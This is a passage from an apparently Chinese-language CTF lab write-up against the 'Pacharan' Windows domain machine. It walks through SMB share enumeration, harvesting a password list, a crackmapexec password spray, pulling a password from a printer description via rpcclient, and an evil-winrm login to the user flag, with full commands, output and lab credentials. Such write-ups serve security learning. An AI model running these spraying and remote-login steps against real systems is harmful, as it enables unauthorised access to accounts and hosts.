getting <span class="token function">file</span> <span class="token punctuation">\</span>Orujo.txt of size <span class="token number">22</span> as Orujo.txt <span class="token punctuation">(</span><span class="token number">10.7</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">10.7</span> KiloBytes/sec<span class="token punctuation">)</span>
smb: <span class="token punctuation">\</span><span class="token operator">></span> ^C</code></pre>
<p>在第二个登录共享里面拿到一个txt文件，文件名叫毛毛虫</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> Orujo.txt                                                                                                                                                         <span class="token punctuation">[</span><span class="token number">11</span>:52:45<span class="token punctuation">]</span> Pericodelospalotes6969<span class="token comment">#</span></code></pre>
<p>像是一个密码，猜测是Orujo用户密码，尝试winrm登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.69.69 <span class="token parameter variable">-u</span> Orujo <span class="token parameter variable">-p</span> Pericodelospalotes6969                                                                                                        <span class="token punctuation">[</span><span class="token number">11</span>:59:25<span class="token punctuation">]</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine

Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>

Info: Establishing connection to remote endpoint
^C

Warning: Press <span class="token string">"y"</span> to exit, press any other key to <span class="token builtin class-name">continue</span>

Info: Exiting<span class="token punctuation">..</span>.</code></pre>
<p>失败，尝试列出共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbmap <span class="token parameter variable">-u</span> <span class="token string">"Orujo"</span> <span class="token parameter variable">-p</span> <span class="token string">"Pericodelospalotes6969"</span> <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.69.69                                                                                                        <span class="token punctuation">[</span><span class="token number">11</span>:59:52<span class="token punctuation">]</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com<span class="token operator">&lt;</span>mailto:ShawnDEvans@gmail.com<span class="token operator">></span>
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB connections<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">1</span> authenticated session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión
        NETLOGON2                                               NO ACCESS
        PACHARAN                                                READ ONLY
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
        Users                                                   NO ACCESS
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed <span class="token number">1</span> connections</code></pre>
<p>可以访问<code>PACHARAN </code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbclient <span class="token parameter variable">-U</span> <span class="token string">'Orujo%Pericodelospalotes6969'</span>   //192.168.69.69/pacharan                                                                                                <span class="token punctuation">[</span><span class="token number">12</span>:06:18<span class="token punctuation">]</span> Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Thu Aug  <span class="token number">1</span> 01:21:13 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Thu Aug  <span class="token number">1</span> 01:21:13 <span class="token number">2024</span>
  ah.txt                              A      <span class="token number">921</span>  Thu Aug  <span class="token number">1</span> 01:20:16 <span class="token number">2024</span>

                <span class="token number">7735807</span> blocks of size <span class="token number">4096</span>. <span class="token number">4357952</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> get ah.txt
getting <span class="token function">file</span> <span class="token punctuation">\</span>ah.txt of size <span class="token number">921</span> as ah.txt <span class="token punctuation">(</span><span class="token number">449.7</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">449.7</span> KiloBytes/sec<span class="token punctuation">)</span>
smb: <span class="token punctuation">\</span><span class="token operator">></span> ^C</code></pre>
<p>又拿到一个txt</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> ah.txt                                                                                                                                                            <span class="token punctuation">[</span><span class="token number">12</span>:06:30<span class="token punctuation">]</span> Mamasoystreamer1<span class="token operator">!</span>
Mamasoystreamer2@
Mamasoystreamer3<span class="token comment">#</span>
Mamasoystreamer4$
Mamasoystreamer5%
Mamasoystreamer6^
Mamasoystreamer7<span class="token operator">&amp;</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>像是一个密码字典，枚举一下用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.69.69 <span class="token parameter variable">--users</span> <span class="token parameter variable">-u</span> Orujo <span class="token parameter variable">-p</span> Pericodelospalotes6969                                                                                             <span class="token punctuation">[</span><span class="token number">12</span>:13:57<span class="token punctuation">]</span> SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2016</span> Build <span class="token number">14393</span> x64 <span class="token punctuation">(</span>name:WIN-VRU3GG3DPLJ<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:PACHARAN.THL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Orujo:Pericodelospalotes6969
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerated domain user<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Gordons                        badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>RedLabel                       badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>CarlosV                        badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>beefeater                      badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Chivas                         badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>JB                             badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Whisky2                        badpwdcount: <span class="token number">1</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Chivas Regal                   badpwdcount: <span class="token number">0</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Hendrick                       badpwdcount: <span class="token number">2</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Whisky                         badpwdcount: <span class="token number">0</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Ginebra                        badpwdcount: <span class="token number">53</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Orujo                          badpwdcount: <span class="token number">0</span> desc:
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>krbtgt                         badpwdcount: <span class="token number">53</span> desc: Cuenta de servicio de centro de distribución de claves
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>DefaultAccount                 badpwdcount: <span class="token number">53</span> desc: Cuenta de usuario administrada por el sistema.
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Invitado                       badpwdcount: <span class="token number">51</span> desc: Cuenta integrada para el acceso como invitado al equipo o dominio
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  PACHARAN.THL<span class="token punctuation">\</span>Administrador                  badpwdcount: <span class="token number">0</span> desc: Cuenta integrada para la administración del equipo o dominio</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.69.69 <span class="token parameter variable">--users</span> <span class="token parameter variable">-u</span> Orujo <span class="token parameter variable">-p</span> Pericodelospalotes6969 <span class="token operator">></span> output.txt                                                                                <span class="token punctuation">[</span><span class="token number">12</span>:35:28<span class="token punctuation">]</span> root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> output.txt<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print substr($5, 14)&#125;'</span>  <span class="token operator">></span>usernames.txt                                                                                                          <span class="token punctuation">[</span><span class="token number">12</span>:36:05<span class="token punctuation">]</span> root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> usernames.txt                                                                                                                                                     <span class="token punctuation">[</span><span class="token number">12</span>:36:08<span class="token punctuation">]</span>



Gordons
RedLabel
CarlosV
beefeater
Chivas
JB
Whisky2
Chivas
Hendrick
Whisky
Ginebra
Orujo
krbtgt
DefaultAccount
Invitado
Administrador</code></pre>
<p>有个用户名带空格补全一下<code>Chivas Regal</code>，然后密码喷洒攻击一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.69.69  <span class="token parameter variable">-u</span> usernames.txt <span class="token parameter variable">-p</span> ah.txt --continue-on-success
         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2016</span> Build <span class="token number">14393</span> x64 <span class="token punctuation">(</span>name:WIN-VRU3GG3DPLJ<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:PACHARAN.THL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer1<span class="token operator">!</span> STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer2@ STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer3<span class="token comment"># STATUS_LOGON_FAILURE</span>
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer4$ STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer5% STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer6^ STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer7<span class="token operator">&amp;</span> STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:Mamasoystreamer8* STATUS_LOGON_FAILURE
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Whisky:MamasoyStream2er@
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span></code></pre>
<p>有一组正确账号密码<code>Whisky:MamasoyStream2er@</code><br>没出意外，winrm还是登不上，再看一下共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbmap <span class="token parameter variable">-u</span> <span class="token string">"Whisky"</span> <span class="token parameter variable">-p</span> <span class="token string">"MamasoyStream2er@"</span> <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.69.69                                                                                                            <span class="token punctuation">[</span><span class="token number">12</span>:20:22<span class="token punctuation">]</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com<span class="token operator">&lt;</span>mailto:ShawnDEvans@gmail.com<span class="token operator">></span>
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB connections<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">1</span> authenticated session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión
        NETLOGON2                                               NO ACCESS
        PACHARAN                                                NO ACCESS
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
        Users                                                   NO ACCESS
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed <span class="token number">1</span> connections</code></pre>
<h2 id="enumprinters"><a href="#enumprinters" class="headerlink" title="enumprinters"></a>enumprinters</h2><p>再枚举一次，这次用rpcclient枚举开头提到的打印机服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  rpcclient <span class="token parameter variable">-U</span> Whisky  <span class="token number">192.168</span>.69.69                                                                                                                                    <span class="token punctuation">[</span><span class="token number">13</span>:03:41<span class="token punctuation">]</span> Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>Whisky<span class="token punctuation">]</span>:
rpcclient $<span class="token operator">></span> enumprinters
        flags:<span class="token punctuation">[</span>0x800000<span class="token punctuation">]</span>
        name:<span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.69.69<span class="token punctuation">\</span>Soy Hacker y arreglo impresoras<span class="token punctuation">]</span>
        description:<span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.69.69<span class="token punctuation">\</span>Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1<span class="token punctuation">]</span>
        comment:<span class="token punctuation">[</span>Soy Hacker y arreglo impresoras<span class="token punctuation">]</span></code></pre>
<p>有个描述<code>TurkisArrusPuchuchuSiu1</code>看起来像密码，喷洒一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.69.69  <span class="token parameter variable">-u</span> usernames.txt <span class="token parameter variable">-p</span> TurkisArrusPuchuchuSiu1 --continue-on-success                                                                     <span class="token punctuation">[</span><span class="token number">13</span>:36:25<span class="token punctuation">]</span> SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2016</span> Build <span class="token number">14393</span> x64 <span class="token punctuation">(</span>name:WIN-VRU3GG3DPLJ<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:PACHARAN.THL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Gordons:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>RedLabel:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Chivas Regal:TurkisArrusPuchuchuSiu1
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>beefeater:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Chivas:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>JB:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Whisky2:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Chivas:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE
SMB         <span class="token number">192.168</span>.69.69   <span class="token number">445</span>    WIN-VRU3GG3DPLJ  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> PACHARAN.THL<span class="token punctuation">\</span>Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE</code></pre>
<p>又拿到一组<code>Chivas Regal:TurkisArrusPuchuchuSiu1</code>，这次winrm成功了</p>
<h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.69.69 <span class="token parameter variable">-u</span> <span class="token string">"PACHARAN.THL\Chivas Regal"</span> <span class="token parameter variable">-p</span> TurkisArrusPuchuchuSiu1                                                                                 <span class="token punctuation">[</span><span class="token number">13</span>:36:28<span class="token punctuation">]</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine

Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>

Info: Establishing connection to remote endpoint</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chivas Regal<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>


    Directorio: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chivas Regal<span class="token punctuation">\</span>Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         <span class="token number">8</span>/1/2024  <span class="token number">10</span>:29 AM             <span class="token number">36</span> user.txt


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chivas Regal<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> user.txt
********</code></pre>
<p>拿到user flag</p>
